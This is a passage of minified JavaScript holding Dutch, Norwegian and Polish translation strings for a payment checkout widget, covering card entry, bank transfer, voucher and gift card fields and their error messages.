3456","creditCard.expiryDateField.title":"Vervaldatum","creditCard.expiryDateField.placeholder":"MM/JJ","creditCard.expiryDateField.month":"Maand","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"JJ","creditCard.expiryDateField.year":"Jaar","creditCard.cvcField.title":"Verificatiecode","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Onthouden voor de volgende keer","creditCard.cvcField.placeholder.4digits":"4 cijfers","creditCard.cvcField.placeholder.3digits":"3 cijfers","creditCard.taxNumber.placeholder":"JJMMDD / 0123456789",installments:"Aantal termijnen",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} maanden","installments.oneTime":"Eenmalige betaling","installments.installments":"Betaling termijnen","installments.revolving":"Terugkerende betaling","sepaDirectDebit.ibanField.invalid":"Ongeldig rekeningnummer","sepaDirectDebit.nameField.placeholder":"P. de Ridder","sepa.ownerName":"Ten name van","sepa.ibanNumber":"Rekeningnummer (IBAN)","error.title":"Fout","error.subtitle.redirect":"Doorsturen niet gelukt","error.subtitle.payment":"Betaling is niet geslaagd","error.subtitle.refused":"Betaling geweigerd","error.message.unknown":"Er is een onbekende fout opgetreden","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Selecteer uw bank","creditCard.success":"Betaling geslaagd",loading:"Laden....",continue:"Doorgaan",continueTo:"Doorgaan naar","wechatpay.timetopay":"U heeft %@ om te betalen","wechatpay.scanqrcode":"QR-code scannen",personalDetails:"Persoonlijke gegevens",companyDetails:"Bedrijfsgegevens","companyDetails.name":"Bedrijfsnaam","companyDetails.registrationNumber":"Registratienummer",socialSecurityNumber:"Burgerservicenummer",firstName:"Voornaam",infix:"Voorvoegsel",lastName:"Achternaam",mobileNumber:"Telefoonnummer mobiel","mobileNumber.invalid":"Ongeldig mobiel nummer",city:"Stad",postalCode:"Postcode",countryCode:"Landcode",telephoneNumber:"Telefoonnummer",dateOfBirth:"Geboortedatum",shopperEmail:"E-mailadres",gender:"Geslacht",male:"Man",female:"Vrouw",billingAddress:"Factuuradres",street:"Straatnaam",stateOrProvince:"Staat of provincie",country:"Land",houseNumberOrName:"Huisnummer",separateDeliveryAddress:"Een afwijkend bezorgadres opgeven",deliveryAddress:"Bezorgadres",zipCode:"Postcode",apartmentSuite:"Appartement/Suite",provinceOrTerritory:"Provincie of territorium",cityTown:"Stad",address:"Adres",state:"Staat","field.title.optional":"(optioneel)","creditCard.cvcField.title.optional":"CVC / CVV (optioneel)","issuerList.wallet.placeholder":"Selecteer uw portemonnee",privacyPolicy:"Privacybeleid","afterPay.agreement":"Ik ga akkoord met de %@ van AfterPay",paymentConditions:"betalingsvoorwaarden",openApp:"Open de app","voucher.readInstructions":"Instructies lezen","voucher.introduction":"Bedankt voor uw aankoop. Gebruik deze coupon om uw betaling te voltooien.","voucher.expirationDate":"Vervaldatum","voucher.alternativeReference":"Alternatieve referentie","dragonpay.voucher.non.bank.selectField.placeholder":"Selecteer uw aanbieder","dragonpay.voucher.bank.selectField.placeholder":"Selecteer uw bank","voucher.paymentReferenceLabel":"Betalingsreferentie","voucher.surcharge":"Inclusief %@ toeslag","voucher.introduction.doku":"Bedankt voor uw aankoop. Gebruik de volgende informatie om uw betaling te voltooien.","voucher.shopperName":"Klantnaam","voucher.merchantName":"Verkoper","voucher.introduction.econtext":"Bedankt voor uw aankoop. Gebruik de volgende informatie om uw betaling te voltooien.","voucher.telephoneNumber":"Telefoonnummer","voucher.shopperReference":"Klant referentie","voucher.collectionInstitutionNumber":"Nummer ophaallocatie","voucher.econtext.telephoneNumber.invalid":"Het telefoonnummer moet uit 10 of 11 cijfers bestaan","boletobancario.btnLabel":"Boleto genereren","boleto.sendCopyToEmail":"Stuur een kopie naar mijn e-mailadres","button.copy":"Kopiëren","button.download":"Downloaden","creditCard.storedCard.description.ariaLabel":"Opgeslagen kaart eindigt op %@","voucher.entity":"Entiteit",donateButton:"Doneren",notNowButton:"Niet nu",thanksForYourSupport:"Bedankt voor uw donatie!",preauthorizeWith:"Preautorisatie uitvoeren met",confirmPreauthorization:"Preautorisatie bevestigen",confirmPurchase:"Aankoop bevestigen",applyGiftcard:"Inwisselen",giftcardBalance:"Saldo cadeaukaart",deductedBalance:"Afgetrokken bedrag","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Eerste twee cijfers van het wachtwoord van de kaart","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Ongeldig wachtwoord","creditCard.taxNumber.label":"Geboortedatum (JJ-MM-DD) of bedrijfsregistratienummer (10 cijfers) van kaarthouder","creditCard.taxNumber.labelAlt":"Bedrijfsregistratienummer (10 cijfers)","creditCard.taxNumber.invalid":"Geboortedatum of bedrijfsregistratienummer van kaarthouder is ongeldig","storedPaymentMethod.disable.button":"Verwijderen","storedPaymentMethod.disable.confirmation":"Opgeslagen betalingsmethode verwijderen","storedPaymentMethod.disable.confirmButton":"Ja, verwijderen","storedPaymentMethod.disable.cancelButton":"Annuleren","ach.bankAccount":"Bankrekening","ach.accountHolderNameField.title":"Naam rekeninghouder","ach.accountHolderNameField.placeholder":"J. Janssen","ach.accountHolderNameField.invalid":"Ongeldige naam rekeninghouder","ach.accountNumberField.title":"Rekeningnummer","ach.accountNumberField.invalid":"Ongeldig rekeningnummer","ach.accountLocationField.title":"Routingnummer (ABA)","ach.accountLocationField.invalid":"Ongeldig routingnummer (ABA)","select.state":"Selecteer staat","select.stateOrProvince":"Selecteer staat of provincie","select.provinceOrTerritory":"Selecteer provincie of territorium","select.country":"Selecteer land","select.noOptionsFound":"Geen opties gevonden","select.filter.placeholder":"Zoeken...","telephoneNumber.invalid":"Ongeldig telefoonnummer",qrCodeOrApp:"of","paypal.processingPayment":"Betaling wordt verwerkt...",generateQRCode:"Genereer QR-code","await.waitForConfirmation":"Wacht op bevestiging","mbway.confirmPayment":"Bevestig uw betaling via de MB WAY-app","shopperEmail.invalid":"Ongeldig e-mailadres","dateOfBirth.format":"DD/MM/JJJJ","dateOfBirth.invalid":"U moet minimaal 18 jaar oud zijn","blik.confirmPayment":"Open uw bankapp om de betaling te bevestigen.","blik.invalid":"Voer 6 cijfers in","blik.code":"6-cijferige code","blik.help":"Haal de code op in uw bankapp.","swish.pendingMessage":"Nadat u hebt gescand, kan de status maximaal 10 minuten in behandeling zijn. Als u binnen deze periode opnieuw probeert te betalen, kunnen er meerdere keren kosten in rekening worden gebracht.","error.va.gen.01":"Onvolledig veld","error.va.gen.02":"Veld niet geldig","error.va.sf-cc-num.01":"Ongeldig kaartnummer","error.va.sf-cc-num.03":"Niet-ondersteunde kaart ingevoerd","error.va.sf-cc-dat.01":"Kaart te oud","error.va.sf-cc-dat.02":"Datum te ver in de toekomst","error.va.sf-cc-dat.03":"Uw kaart verloopt voor de betaaldatum","error.giftcard.no-balance":"Deze cadeaukaart heeft geen saldo","error.giftcard.card-error":"We hebben geen cadeaukaart met dit nummer in onze administratie","error.giftcard.currency-error":"Cadeaukaarten zijn alleen geldig in de valuta waarin ze zijn uitgegeven","amazonpay.signout":"Afmelden bij Amazon","amazonpay.changePaymentDetails":"Betalingsgegevens wijzigen","partialPayment.warning":"Selecteer een andere betaalmethode om het resterende deel te betalen","partialPayment.remainingBalance":"Het resterende saldo is %{amount}","bankTransfer.beneficiary":"Begunstigde","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referentie","bankTransfer.introduction":"Ga door om een nieuwe overschrijving aan te maken. U kunt de gegevens in het volgende scherm gebruiken om deze betaling af te ronden.","bankTransfer.instructions":"Bedankt voor uw aankoop. Gebruik de volgende informatie om uw betaling te voltooien.","bacs.accountHolderName":"Naam bankrekeninghouder","bacs.accountHolderName.invalid":"Ongeldige naam bankrekeninghouder","bacs.accountNumber":"Bankrekeningnummer","bacs.accountNumber.invalid":"Ongeldig bankrekeningnummer","bacs.bankLocationId":"Bankcode","bacs.bankLocationId.invalid":"Ongeldige bankcode","bacs.consent.amount":"Ik ga ermee akkoord dat het bovengenoemde bedrag van mijn bankrekening wordt afgeschreven.","bacs.consent.account":"Ik bevestig dat de rekening op mijn naam staat en dat ik de enige ondertekenaar ben die toestemming kan geven voor automatische incasso's vanaf deze rekening.",edit:"Bewerken","bacs.confirm":"Bevestigen en betalen","bacs.result.introduction":"Download uw machtiging automatische incasso","download.pdf":"PDF downloaden","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe voor beveiligd kaartnummer","creditCard.encryptedCardNumber.aria.label":"Veld voor kaartnummer","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe voor vervaldatum beveiligde kaart","creditCard.encryptedExpiryDate.aria.label":"Veld voor vervaldatum","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe voor vervalmaand beveiligde kaart","creditCard.encryptedExpiryMonth.aria.label":"Veld voor vervalmaand","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe voor vervaljaar beveiligde kaart","creditCard.encryptedExpiryYear.aria.label":"Veld voor vervaljaar","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe voor beveiligingscode beveiligde kaart","creditCard.encryptedSecurityCode.aria.label":"Veld voor beveiligingscode","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe voor beveiligd cadeaubonnummer","giftcard.encryptedCardNumber.aria.label":"Veld voor cadeaubonnummer","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe voor beveiligingscode beveiligde cadeaubon","giftcard.encryptedSecurityCode.aria.label":"Veld beveiligingscode cadeaubon",giftcardTransactionLimit:"Max. %{amount} toegestaan per transactie met deze cadeaubon","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe voor beveiligd bankrekeningnummer","ach.encryptedBankAccountNumber.aria.label":"Veld voor bankrekening","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe voor beveiligde BIC-code","ach.encryptedBankLocationId.aria.label":"Veld voor BIC-code"}}),Zv=Object.freeze({__proto__:null,default:{payButton:"Betal","payButton.redirecting":"Omdirigerer...",storeDetails:"Lagre til min neste betaling","creditCard.holderName":"Navn på kortet","creditCard.holderName.placeholder":"O. Nordmann","creditCard.holderName.invalid":"Ugyldig navn på kortholder","creditCard.numberField.title":"Kortnummer","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Utløpsdato","creditCard.expiryDateField.placeholder":"MM/ÅÅ","creditCard.expiryDateField.month":"Måned","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"ÅÅ","creditCard.expiryDateField.year":"År","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Husk til neste gang","creditCard.cvcField.placeholder.4digits":"4 siffer","creditCard.cvcField.placeholder.3digits":"3 siffer","creditCard.taxNumber.placeholder":"YYMMDD / 0123456789",installments:"Antall avdrag",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} måneder","installments.oneTime":"Engangsbetaling","installments.installments":"Avdragsbetaling","installments.revolving":"Gjentakende betaling","sepaDirectDebit.ibanField.invalid":"Ugyldig kontonummer","sepaDirectDebit.nameField.placeholder":"O. Nordmann","sepa.ownerName":"Kortholders navn","sepa.ibanNumber":"Kontonummer (IBAN)","error.title":"Feil","error.subtitle.redirect":"Videresending feilet","error.subtitle.payment":"Betaling feilet","error.subtitle.refused":"Betaling avvist","error.message.unknown":"En ukjent feil oppstod","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Velg din bank","creditCard.success":"Betalingen var vellykket",loading:"Laster...",continue:"Fortsett",continueTo:"Fortsett til","wechatpay.timetopay":"Du har %@ igjen til å betale","wechatpay.scanqrcode":"Skann QR-kode",personalDetails:"Personopplysninger",companyDetails:"Firmadetaljer","companyDetails.name":"Firmanavn","companyDetails.registrationNumber":"Registreringsnummer",socialSecurityNumber:"Personnummer",firstName:"Fornavn",infix:"Prefiks",lastName:"Etternavn",mobileNumber:"Mobilnummer","mobileNumber.invalid":"Ugyldig mobilnummer",city:"Poststed",postalCode:"Postnummer",countryCode:"Landkode",telephoneNumber:"Telefonnummer",dateOfBirth:"Fødselsdato",shopperEmail:"E-postadresse",gender:"Kjønn",male:"Mann",female:"Kvinne",billingAddress:"Faktureringsadresse",street:"Gate",stateOrProvince:"Fylke",country:"Land",houseNumberOrName:"Husnummer",separateDeliveryAddress:"Spesifiser en separat leveringsadresse",deliveryAddress:"Leveringsadresse",zipCode:"Postnummer",apartmentSuite:"Leilighet/suite",provinceOrTerritory:"Provins eller territorium",cityTown:"By",address:"Adresse",state:"Delstat","field.title.optional":"(valgfritt)","creditCard.cvcField.title.optional":"CVC / CVV (valgfritt)","issuerList.wallet.placeholder":"Velg lommebok",privacyPolicy:"Retningslinjer for personvern","afterPay.agreement":"Jeg godtar AfterPays %@",paymentConditions:"betalingsbetingelser",openApp:"Åpne appen","voucher.readInstructions":"Les instruksjoner","voucher.introduction":"Takk for ditt kjøp. Vennligst bruk den følgende kupongen til å fullføre betalingen.","voucher.expirationDate":"Utløpsdato","voucher.alternativeReference":"Alternativ referanse","dragonpay.voucher.non.bank.selectField.placeholder":"Velg din leverandør","dragonpay.voucher.bank.selectField.placeholder":"Velg din bank","voucher.paymentReferenceLabel":"Betalingsreferanse","voucher.surcharge":"Inkl. %@ tilleggsavgift","voucher.introduction.doku":"Takk for ditt kjøp, vennligst bruk den følgende informasjonen for å fullføre betalingen.","voucher.shopperName":"Kundenavn","voucher.merchantName":"Forhandler","voucher.introduction.econtext":"Takk for ditt kjøp, vennligst bruk den følgende informasjonen for å fullføre betalingen.","voucher.telephoneNumber":"Telefonnummer","voucher.shopperReference":"Kundereferanse","voucher.collectionInstitutionNumber":"Innbetalingslokasjonsnummer","voucher.econtext.telephoneNumber.invalid":"Telefonnummeret må være 10 eller 11 sifre langt","boletobancario.btnLabel":"Generer Boleto","boleto.sendCopyToEmail":"Send meg en kopi på e-post","button.copy":"Kopier","button.download":"Last ned","creditCard.storedCard.description.ariaLabel":"Lagret kort slutter på %@","voucher.entity":"Enhet",donateButton:"Donér",notNowButton:"Ikke nå",thanksForYourSupport:"Takk for din støtte!",preauthorizeWith:"Forhåndsgodkjenn med",confirmPreauthorization:"Bekreft forhåndsgodkjenning",confirmPurchase:"Bekreft kjøp",applyGiftcard:"Løs inn",giftcardBalance:"Gavekortsaldo",deductedBalance:"Fratrukket beløp","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Første 2 sifre av kortpassord","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Ugyldig passord","creditCard.taxNumber.label":"Kortholders fødselsdato (YYMMDD) eller bedriftsregistreringsnummer (10 siffer)","creditCard.taxNumber.labelAlt":"Bedriftsregistreringsnummer (10 siffer)","creditCard.taxNumber.invalid":"Ugyldig kortholders fødselsdato eller bedriftsregistreringsnummer","storedPaymentMethod.disable.button":"Fjern","storedPaymentMethod.disable.confirmation":"Fjern lagret betalingsmetode","storedPaymentMethod.disable.confirmButton":"Ja, fjern","storedPaymentMethod.disable.cancelButton":"Avbryt","ach.bankAccount":"Bankkonto","ach.accountHolderNameField.title":"Kontoholders navn","ach.accountHolderNameField.placeholder":"O. Nordmann","ach.accountHolderNameField.invalid":"Ugyldig navn på kontoholder","ach.accountNumberField.title":"Kontonummer","ach.accountNumberField.invalid":"Ugyldig kontonummer","ach.accountLocationField.title":"ABA-dirigeringsnummer","ach.accountLocationField.invalid":"Ugyldig ABA-dirigeringsnummer","select.state":"Velg delstat","select.stateOrProvince":"Velg delstat eller provins","select.provinceOrTerritory":"Velg provins eller territorium","select.country":"Velg land","select.noOptionsFound":"Ingen alternativer funnet","select.filter.placeholder":"Søk …","telephoneNumber.invalid":"Ugyldig telefonnummer",qrCodeOrApp:"eller","paypal.processingPayment":"Behandler betaling …",generateQRCode:"Generer QR-kode","await.waitForConfirmation":"Venter på bekreftelse","mbway.confirmPayment":"Bekreft betalingen din i MB WAY-appen","shopperEmail.invalid":"Ugyldig e-postadresse","dateOfBirth.format":"DD/MM/ÅÅÅÅ","dateOfBirth.invalid":"Du må være minst 18 år gammel","blik.confirmPayment":"Åpne bank-appen din for å bekrefte betalingen.","blik.invalid":"Tast inn 6 tall","blik.code":"6-sifret kode","blik.help":"Hent koden fra bank-appen din.","swish.pendingMessage":"Etter at du har skannet koden kan det ta opptil 10 minutter før betalingen vises som bekreftet. Forsøk på å betale igjen kan føre til flere innbetalinger.","error.va.gen.01":"Ufullstendig felt","error.va.gen.02":"Feltet er ikke gyldig","error.va.sf-cc-num.01":"Ugyldig kortnummer","error.va.sf-cc-num.03":"Det angitte kortet støttes ikke","error.va.sf-cc-dat.01":"Kortet er for gammelt","error.va.sf-cc-dat.02":"Datoen er for langt inn i fremtiden","error.va.sf-cc-dat.03":"Kortet ditt utløper før betalingsdatoen","error.giftcard.no-balance":"Dette gavekortet har en saldo på null","error.giftcard.card-error":"Vi har ikke noe gavekort med dette nummeret i registrene våre","error.giftcard.currency-error":"Gavekort er kun gyldige i den valutaen de ble utstedt i","amazonpay.signout":"Logg ut av Amazon","amazonpay.changePaymentDetails":"Endre betalingsdetaljer","partialPayment.warning":"Velg en annen betalingsmetode for å betale det gjenværende","partialPayment.remainingBalance":"Gjenværende saldo vil være %{amount}","bankTransfer.beneficiary":"Mottaker","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"referanse","bankTransfer.introduction":"Fortsett for å opprette en ny betaling via bankoverføring. Du kan bruke detaljene i det følgende skjermbildet for å fullføre betalingen.","bankTransfer.instructions":"Takk for kjøpet. Vennligst benytt den følgende informasjonen til å fullføre betalingen.","bacs.accountHolderName":"Kontoholders navn","bacs.accountHolderName.invalid":"Ugyldig kontoholdernavn","bacs.accountNumber":"Bankkontonummer","bacs.accountNumber.invalid":"Ugyldig bankkontonummer","bacs.bankLocationId":"Sorteringskode","bacs.bankLocationId.invalid":"Ugyldig sorteringskode","bacs.consent.amount":"Jeg samtykker til at beløpet ovenfor blir trukket fra bankkontoen min.","bacs.consent.account":"Jeg bekrefter at kontoen står i mitt navn, og at jeg er den eneste signataren som kreves for å autorisere direktebelastningen på denne kontoen.",edit:"Endre","bacs.confirm":"Bekreft og betal","bacs.result.introduction":"Last ned instruksjoner for direktebelastning (DDI/ mandat)","download.pdf":"Last ned PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe for sikret kortnummer","creditCard.encryptedCardNumber.aria.label":"Kortnummerfelt","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe for sikret kortutløpsdato","creditCard.encryptedExpiryDate.aria.label":"Felt for utløpsdato","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe for sikret kortutløpsmåned","creditCard.encryptedExpiryMonth.aria.label":"Felt for utløpsmåned","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe for sikret kortutløpsår","creditCard.encryptedExpiryYear.aria.label":"Felt for utløpsår","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe for sikret kortsikkerhetskode","creditCard.encryptedSecurityCode.aria.label":"Felt for sikkerhetskode","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe for sikret gavekortnummer","giftcard.encryptedCardNumber.aria.label":"Felt for gavekortnummer","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe for sikret gavekort-sikkerhetskode","giftcard.encryptedSecurityCode.aria.label":"Felt for sikkerhetskode for gavekort",giftcardTransactionLimit:"Maksimalt %{amount} per transaksjon er tillatt på dette gavekortet","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe for sikret bankkontonummer","ach.encryptedBankAccountNumber.aria.label":"Bankkontofelt","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe for sikret bankdirigeringsnummer","ach.encryptedBankLocationId.aria.label":"Felt for bankdirigeringsnummer"}}),eg=Object.freeze({__proto__:null,default:{payButton:"Zapłać","payButton.redirecting":"Przekierowywanie...",storeDetails:"Zapisz na potrzeby następnej płatności","creditCard.holderName":"Imię i nazwisko na karcie","creditCard.holderName.placeholder":"J. Kowalski","creditCard.holderName.invalid":"Nieprawidłowe imię i nazwisko posiadacza karty","creditCard.numberField.title":"Numer karty ","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Data ważności","creditCard.expiryDateField.placeholder":"MM/RR","creditCard.expiryDateField.month":"Miesiąc","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"RR","creditCard.expiryDateField.year":"Rok","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Zapamiętaj na przyszłość","creditCard.cvcField.placeholder.4digits":"4 cyfry","creditCard.cvcField.placeholder.3digits":"3 cyfry","creditCard.taxNumber.placeholder":"RRMMDD / 0123456789",installments:"Liczba rat",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} miesięcy","installments.oneTime":"Płatność jednorazowa","installments.installments":"Płatność ratalna","installments.revolving":"Płatność odnawialna","sepaDirectDebit.ibanField.invalid":"Nieprawidłowy numer rachunku","sepaDirectDebit.nameField.placeholder":"J. Kowalski","sepa.ownerName":"Imię i nazwisko posiadacza karty","sepa.ibanNumber":"Numer rachunku (IBAN)","error.title":"Błąd","error.subtitle.redirect":"Przekierowanie nie powiodło się","error.subtitle.payment":"Płatność nie powiodła się","error.subtitle.refused":"Płatność została odrzucona","error.message.unknown":"Wystąpił nieoczekiwany błąd","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Wybierz swój bank","creditCard.success":"Płatność zakończona sukcesem",loading:"Ładowanie...",continue:"Kontynuuj",continueTo:"Przejdź do","wechatpay.timetopay":"Masz do zapłacenia %@","wechatpay.scanqrcode":"Zeskanuj kod QR",personalDetails:"Dane osobowe",companyDetails:"Dane firmy","companyDetails.name":"Nazwa firmy","companyDetails.registrationNumber":"Numer w rejestrze",socialSecurityNumber:"Numer dowodu osobistego",firstName:"Imię",infix:"Prefiks",lastName:"Nazwisko",mobileNumber:"Numer telefonu komórkowego","mobileNumber.invalid":"Nieprawidłowy numer telefonu komórkowego",city:"Miasto",postalCode:"Kod pocztowy",countryCode:"Kod kraju",telephoneNumber:"Numer telefonu",dateOfBirth:"Data urodzenia",shopperEmail:"Adres e-mail",gender:"Płeć",male:"Mężczyzna",female:"Kobieta",billingAddress:"Adres rozliczeniowy",street:"Ulica",stateOrProvince:"Województwo",country:"Kraj",houseNumberOrName:"Numer domu i mieszkania",separateDeliveryAddress:"Podaj osobny adres dostawy",deliveryAddress:"Adres dostawy",zipCode:"Kod pocztowy",apartmentSuite:"Numer domu/mieszkania",provinceOrTerritory:"Region lub terytorium",cityTown:"Miejscowość",address:"Adres",state:"Stan","field.title.optional":"(opcjonalnie)","creditCard.cvcField.title.optional":"CVC / CVV (opcjonalnie)","issuerList.wallet.placeholder":"Wybierz swój portfel",privacyPolicy:"Polityka prywatności.","afterPay.agreement":"Zgadzam się z dokumentem %@ AfterPay",paymentConditions:"warunki płatności",openApp:"Otwórz aplikację","voucher.readInstructions":"Przeczytaj instrukcje","voucher.introduction":"Dziękujemy za zakup, dokończ płatność przy użyciu tego kuponu.","voucher.expirationDate":"Data ważności","voucher.alternativeReference":"Dodatkowy numer referencyjny","dragonpay.voucher.non.bank.selectField.placeholder":"Wybierz dostawcę","dragonpay.voucher.bank.selectField.placeholder":"Wybierz swój bank","voucher.paymentReferenceLabel":"Nr referencyjny płatności","voucher.surcharge":"Zawiera %@ opłaty dodatkowej","voucher.introduction.doku":"Dziękujemy za zakup. Dokończ płatność przy użyciu poniższych informacji.","voucher.shopperName":"Imię i nazwisko klienta","voucher.merchantName":"Sprzedający","voucher.introduction.econtext":"Dziękujemy za zakup. Dokończ płatność przy użyciu poniższych informacji.","voucher.telephoneNumber":"Numer telefonu","voucher.shopperReference":"Dane referencyjne kupujących","voucher.collectionInstitutionNumber":"Numer instytucji pobierającej opłatę","voucher.econtext.telephoneNumber.invalid":"Numer telefonu musi mieć 10 lub 11 cyfr","boletobancario.btnLabel":"Wygeneruj płatność Boleto","boleto.sendCopyToEmail":"Wyślij kopię na mój e-mail","button.copy":"Kopiuj","button.download":"Pobierz","creditCard.storedCard.description.ariaLabel":"Zapisana karta kończy się na % @","voucher.entity":"Pozycja",donateButton:"Przekaż darowiznę",notNowButton:"Nie teraz",thanksForYourSupport:"Dziękujemy za wsparcie!",preauthorizeWith:"Autoryzuj wstępnie za pomocą:",confirmPreauthorization:"Potwierdź autoryzację wstępną",confirmPurchase:"Potwierdź zakup",applyGiftcard:"Wykorzystaj",giftcardBalance:"Saldo karty podarunkowej",deductedBalance:"Saldo potrącone","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Pierwsze 2 cyfry hasła karty","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Nieprawidłowe hasło","creditCard.taxNumber.label":"Data urodzenia posiadacza karty (RRMMDD) lub firmowy numer rejestracyjny (10 cyfr)","creditCard.taxNumber.labelAlt":"Firmowy numer rejestracyjny (10 cyfr)","creditCard.taxNumber.invalid":"Nieprawidłowa data urodzenia posiadacza karty lub nieprawidłowy firmowy numer rejestracyjny","storedPaymentMethod.disable.button":"Usuń","storedPaymentMethod.disable.confirmation":"Usuń zapisaną metodę płatności","storedPaymentMethod.disable.confirmButton":"Tak, usuń","storedPaymentMethod.disable.cancelButton":"Anuluj","ach.bankAccount":"Rachunek bankowy","ach.accountHolderNameField.title":"Imię i nazwisko posiadacza rachunku","ach.accountHolderNameField.placeholder":"J. Kowalski","ach.accountHolderNameField.invalid":"Nieprawidłowe imię i nazwisko posiadacza rachunku","ach.accountNumberField.title":"Numer rachunku","ach.accountNumberField.invalid":"Nieprawidłowy numer rachunku","ach.accountLocationField.title":"Kod bankowy ABA Routing Number","ach.accountLocationField.invalid":"Nieprawidłowy kod bankowy ABA Routing Number","select.state":"Wybierz stan","select.stateOrProvince":"Wybierz stan/województwo","select.provinceOrTerritory":"Wybierz region/terytorium","select.country":"Wybierz kraj","select.noOptionsFound":"Nie znaleziono opcji","select.filter.placeholder":"Szukaj...","telephoneNumber.invalid":"Nieprawidłowy numer telefonu",qrCodeOrApp:"lub","paypal.processingPayment":"Przetwarzanie płatności...",generateQRCode:"Wygeneruj kod QR","await.waitForConfirmation":"Oczekiwanie na potwierdzenie","mbway.confirmPayment":"Potwierdź płatność w aplikacji MB WAY","shopperEmail.invalid":"Niepoprawny adres email","dateOfBirth.format":"DD/MM/RRRR","dateOfBirth.invalid":"Musisz mieć co najmniej 18 lat","blik.confirmPayment":"Otwórz aplikację bankową, aby potwierdzić płatność.","blik.invalid":"Wpisz 6 cyfr","blik.code":"6-cyfrowy kod","blik.help":"Uzyskaj kod ze swojej aplikacji bankowej.","swish.pendingMessage":"Po zeskanowaniu transakcja może mieć status „Oczekująca” do 10 minut. Próba ponownego dokonania płatności w tym czasie może spowodować wielokrotne naliczenie opłaty.","error.va.gen.01":"Niekompletne dane w polu","error.va.gen.02":"Dane w polu są nieprawidłowe","error.va.sf-cc-num.01":"Nieprawidłowy numer karty","error.va.sf-cc-num.03":"Wprowadzono nieobsługiwaną kartę","error.va.sf-cc-dat.01":"Termin ważności karty minął","error.va.sf-cc-dat.02":"Data w zbyt odległej przyszłości","error.va.sf-cc-dat.03":"Twoja karta traci ważność przed datą płatności","error.giftcard.no-balance":"Saldo karty podarunkowej jest puste","error.giftcard.card-error":"W naszych rejestrach nie ma karty podarunkowej o tym numerze","error.giftcard.currency-error":"Karty podarunkowe są ważne tylko w walucie, w której zostały wydane","amazonpay.signout":"Wyloguj się z Amazon","amazonpay.changePaymentDetails":"Zmień szczegóły płatności","partialPayment.warning":"Wybierz inną metodę płatności, aby zapłacić pozostałą kwotę","partialPayment.remainingBalance":"Pozostałe saldo wynosi %(kwota}","bankTransfer.beneficiary":"Beneficjent","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Ref. sprze.","bankTransfer.introduction":"Kontynuuj tworzenie nowej płatności przelewem bankowym. Możesz użyć szczegółów na następnym ekranie, aby sfinalizować tę płatność.","bankTransfer.instructions":"Dziękujemy za zakup. Dokończ płatność przy użyciu poniższych informacji.","bacs.accountHolderName":"Imię i nazwisko posiadacza rachunku","bacs.accountHolderName.invalid":"Nieprawidłowe imię i nazwisko posiadacza rachunku","bacs.accountNumber":"Numer rachunku","bacs.accountNumber.invalid":"Nieprawidłowy numer rachunku","bacs.bankLocationId":"Numer rozliczeniowy SORT","bacs.bankLocationId.invalid":"Nieprawidłowy numer rozliczeniowy SORT","bacs.consent.amount":"Wyrażam zgodę na pobranie powyższej kwoty z mojego rachunku bankowego.","bacs.consent.account":"Potwierdzam, że konto jest zarejestrowane na moje nazwisko i jestem jedynym sygnatariuszem wymaganym do autoryzacji polecenia zapłaty na tym koncie.",edit:"Edytuj","bacs.confirm":"Potwierdź i zapłać","bacs.result.introduction":"Pobierz dyspozycję polecenia zapłaty (DDI/upoważnienie)","download.pdf":"Pobierz PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Element Iframe dla numeru zabezpieczonej karty","creditCard.encryptedCardNumber.aria.label":"Pole numeru karty","creditCard.encryptedExpiryDate.aria.iframeTitle":"Element Iframe dla daty ważności zabezpieczonej karty","creditCard.encryptedExpiryDate.aria.label":"Pole daty ważności","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Element Iframe dla miesiąca wygaśnięcia zabezpieczonej karty","creditCard.encryptedExpiryMonth.aria.label":"Pole miesiąca wygaśnięcia","creditCard.encryptedExpiryYear.aria.iframeTitle":"Element Iframe dla roku wygaśnięcia zabezpieczonej 